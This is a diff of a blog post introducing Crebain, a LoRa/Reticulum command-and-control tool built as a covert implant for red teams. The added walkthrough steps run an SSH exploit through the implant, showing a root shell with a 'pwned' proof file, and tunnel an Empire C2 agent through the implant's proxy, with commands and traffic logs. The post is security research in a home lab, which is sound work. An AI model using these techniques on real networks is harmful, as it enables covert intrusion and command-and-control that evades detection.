@@ -3,7 +3,7 @@ layout: post
 title: "Introducing Crebain"
 categories: [security, rf, c2]
 published: true
-date: 2026-01-13
+date: 2026-02-20
 ---
 
 Crebain is a command and control system that uses the Reticulum Network Stack for transferring data between nodes. The tool is intended to be used by benign actors as a covert, physically deployed device that enables ingressing and egressing a target network via a cryptographically secure communications channel over LoRa (using RNodes and RNS). The idea is that, using Crebain, operators can totally avoid traditional C2 over web, TCP, UDP, or really any standard protocol. It uses a client-server architecture, Python, SQLite, Flask, and RNS to achieve a pretty standard set of C2 functionalities (we're mostly modeling our base use cases after CobaltStrike, Empire, and Metasploit, because we're stuck in 2017). The core C2 functionalities include:
@@ -41,15 +41,7 @@ If you have a C2 implant within a target network already, you can use Crebain's 
 
 [LoRa (Long Range)](https://en.wikipedia.org/wiki/LoRa) is a radio communication technique that employs chirp spread-spectrum modulation, which is interference resistant and **energy efficient**. It's also **license-free** for use on the 902-928 MHz frequency band in the US. You'll typically find it used in IoT applications, but these characteristics make it appealing for use in red team implants and dropboxes. Reticulum (or the Reticulum Network Stack / RNS) is an open source network stack that features desirable security characteristics out of the box, like forward secrecy and **encrypted data transfers**. RNS allows developers to easily transfer data (including large files) securely using LoRa (via the related RNode firmware) in just a few lines of Python.
 
-RNS provides a number of cryptographic security features out of the box that are worth highlighting, especially in the context of a tool like Crebain:
-
-- **All communication is encrypted by default.** RNS uses X25519 ECDH key exchange to derive ephemeral per-packet keys, AES-256-CBC for symmetric encryption, and HMAC-SHA256 for message authentication. There's no unencrypted mode; if you're using RNS, you're using strong encryption.
-- **Forward secrecy on all links.** Each RNS Link (which Crebain uses for both monitoring and proxy communication) performs its own Curve25519 ECDH exchange to derive ephemeral link keys. Compromising a long-term identity key doesn't retroactively expose past link traffic. RNS also supports automatic key ratcheting for per-destination forward secrecy.
-- **Initiator anonymity.** RNS does not include source addresses on any packets. During link establishment, the initiator (in our case, the Crebain client) never reveals identifying information to the network. Authentication only occurs inside the encrypted channel, visible only to the verified destination and no intermediaries. This is a useful property for a covert implant.
-- **Identity-based addressing.** RNS identities are 512-bit Curve25519 keysets (256-bit encryption + 256-bit signing via Ed25519). Destinations are addressed by 128-bit truncated SHA-256 hashes of these keys, which means there are no human-readable or easily fingerprinted addresses on the wire.
-- **Compact and low-overhead protocol.** Link establishment requires only three packets totaling 297 bytes. Combined with LoRa's low data rates, this keeps the RF footprint minimal, which is desirable when you're trying to avoid detection.
-
-The characteristics of both LoRa and RNS were desirable to us, as they allow for **secure, long range, low power data transmission without a license**. This fit our needs for a covert rogue device. The hardware is also **inexpensive and ubiquitous**. This makes a "bring your own infrastructure" covert channel possible for operators, and reduces the reliance on third party infrastructure, such as cellular networks or cloud service providers (which may be a problem from OPSEC and legal perspectives), for long(ish) range operations.
+The characteristics of both LoRa and RNS were desirable to us, as they allow for **secure, long range, low power data transmission without a license**. This fit our needs for a covert rogue device. The hardware is also **inexpensive and ubiquitous**. This makes a "bring your own infrastructure" covert channel possible for operators, and reduces the reliance on third party infrastructure, such as cellular networks or cloud service providers (which may be a problem from OPSEC and legal perspectives), for long range operations (more information on some previous range testing can be found [here]((https://github.com/m1kemu/crebain-framework/blob/main/lora_implant_bsides_2025.pdf))).
 
 ![In some tests, we've gotten very long range data transmissions between two nodes with simple antennas.](/public/images/range_test_1.JPG)
 *In some tests, we've gotten very long range data transmissions with simple antennas.*
@@ -90,7 +82,7 @@ Configuring Crebain devices is straightforward. Here's how I do it.
 4. Clone the Crebain Github repo.
 
    ```bash
-   git clone https://github.com/m1kemu/crebain.git
+   git clone https://github.com/TalkingRockLabs/crebain.git
    ```
 
 5. Set up Crebain with the setup script on both the client and server. You'll be prompted for the type of crebain node (client vs. server), and for supplemental information based on that node type.
@@ -152,8 +144,6 @@ Configuring Crebain devices is straightforward. Here's how I do it.
 ### Confirming Clients
 
 With the devices configured, physically connect your Crebain client device onto the target network. In my case, I'm simply plugging my client into my own router via an ethernet cable. Remember, your client device is your rogue device (or: leave behind, implant, dropbox), which will eventually establish wireless LoRa-based C2 back to your Crebain server.
-
-[insert picture of my client connected to the router]
 
 With your device attached to the network, step through the process below to confirm access.
 
@@ -222,12 +212,21 @@ Once the server-client communication is confirmed, the attack demonstration can 
    ![The file download pane.](/public/images/scan_3.png)
    *The file download pane.*
 
-5. I'll download the PoC, alter it, then upload it using Crebain's file transfer mechanism.
+5. I'll download the PoC, alter it (replacing the target IP address), then upload it using Crebain's file transfer mechanism.
 
    ![The file upload pane.](/public/images/scan_4.png)
    *The file upload pane.*
 
-6. With the exploit uploaded, I issue a command via Crebain to execute it, and see the returned data in the response.
+6. With the exploit uploaded, I issue a command via Crebain to execute it. A quick check on the target SSH server (running within a Docker container) reveals that the exploit was successful, and the proof file (/lab.txt) was written.
+
+   ![Running the exploit](/public/images/exploit_1.JPG)
+   *Running the exploit.*
+
+   ```
+   $ sudo docker exec -it 58e822f3084f bash
+   root@58e822f3084f:~# cat /lab.txt
+   pwnedroot@58e822f3084f:~# 
+   ```
 
 ### Tunneling C2 Web Traffic
 
@@ -241,17 +240,47 @@ The Crebain client features a locally-hosted web proxy server (default port 8080
 
 Here's a walkthrough of how to use the proxy. In this example, I'll be proxying meterpreter C2 traffic from a compromised virtual machine on the same network as the Crebain client.
 
-1. On the Crebain server, I navigate to the Crebain node that I'll use to proxy the C2 traffic. I'll select the proxy tab, and enable the proxy if it's not enabled. Note that this is the exact same Crebain server/client from my previous examples, so it's running on two separate devices on my home network.
+1. On the Crebain server, I navigate to the Crebain node that I'll use to proxy the C2 traffic. I'll select the proxy tab, and enable the proxy if it's not enabled (if you used my example client.conf file, it's enabled by default). Note that this is the exact same Crebain server/client from my previous examples, so it's running on two separate devices on my home network.
 
-2. On a DigitalOcean droplet running Ubuntu Linux, I've installed metasploit. I'll create a meterpreter listener, and generate a simple payload for a target Linux VM. In this payload, I note the web proxy location. This is where the C2 traffic will be proxied to.
+   ![Enabling the proxy.](/public/images/proxy_1.JPG)
+   *Enabling the proxy.*
 
-3. Now, I'll access my target VM (a simulated victim on the target network) and launch the payload.
+2. On a DigitalOcean droplet running Ubuntu Linux, I've installed [Empire C2](https://bc-security.gitbook.io/empire-wiki/quickstart/server). Then, I created a basic HTTP listener, and generated a simple agent payload for the target Linux VM. It's important to note that the generated payload is stageless, as I had issues with getting a working staged payload to reliably flow traffic through the Crebain HTTP proxy.
 
-4. Back on the metasploit side, I see a new session. The C2 is established, and I can freely execute some example commands on the target VM.
+   **Empire Listener configuration**
+   ![The Listener config.](/public/images/agent_1.png)
+   *The Listener config.*
 
-5. The Crebain logs can be inspected to validate that the traffic is traversing Crebain, and ultimately, is being transmitted via LoRa.
+   **Empire Stager configuration**
+   ![The Stager config.](/public/images/agent_2.JPG)
+   *The Stager config.*
 
-Here's a simple diagram explaining how this is happening.
+3. Now, I'll access my target VM (a simulated victim on the target network) and configure the local proxy to route traffic to the Crebain client's web proxy server (192.168.1.31:8080). I found that the Empire native proxy configuration settings didn't work, so I opted to use environment variables to force the C2 traffic through the Crebain web client, then launched the downloaded agent.
+
+   **Setting the proxy env variable to the Crebain web proxy and launching the agent**
+
+   ```
+   export http_proxy="http://192.168.1.31:8080"
+   python3 ~/Downloads/agent.py
+   ```
+
+   **Example Crebain client logs beginning to show the C2 traffic**
+
+   ```
+   DATE raspberrypi python3[811]: DATE - INFO - Proxy: "POST http://C2_IP//news.php HTTP/1.1" 200 -
+   DATE raspberrypi python3[811]: DATE - INFO - [PROXY] Queued message: type=proxy_request request_id=b2167910-cbc5-42db-a44d-a470e7517e2a session_id=N/A queue_size=1
+   DATE raspberrypi python3[811]: DATE - INFO - [PROXY] Waiting for response: request_id=b2167910-cbc5-42db-a44d-a470e7517e2a method=POST url=http://C2_IP//news.php
+   DATE raspberrypi python3[811]: DATE - INFO - [PROXY] Dequeuing message: type=proxy_request request_id=b2167910-cbc5-42db-a44d-a470e7517e2a command_id=N/A
+   DATE raspberrypi python3[811]: DATE - INFO - Using link for data transmission
+   ```
+
+4. Back on the Empire UI (Starkiller) side, I see a new session. The C2 is established.
+
+   **Empire Agent C2 established**
+   ![The Agent was established.](/public/images/agent_3.png)
+   *The Agent was established.*
+
+This is a basic example, and there are a lot of hiccups in how the Crebain web proxy handles traffic. Eventually, the agent expires due to an HTTP 504 that occurs frequently (in my experience) during proxy usage. This can be mitigated using a custom C2 that handles that gracefully, but that's beyond the scope of this proof-of-concept. Here's a simple diagram explaining how the C2 flow is happening.
 
 ![Crebain C2 Tunneling Flow](/public/images/crebain_c2_flow.png)
 
@@ -261,7 +290,7 @@ If you've gotten this far, thanks for reading, and feel free to reach out with a
 
 ## Resources
 
-- [Crebain Framework GitHub repo](https://github.com/m1kemu/crebain-framework)
+- [Crebain Framework GitHub repo](https://github.com/TalkingRockLabs/crebain)
 - [RNS](https://reticulum.network/)
 - [RNode](https://unsigned.io/rnode/)
 - [Mark Qvist's blog](https://unsigned.io/index.html) (currently inactive)
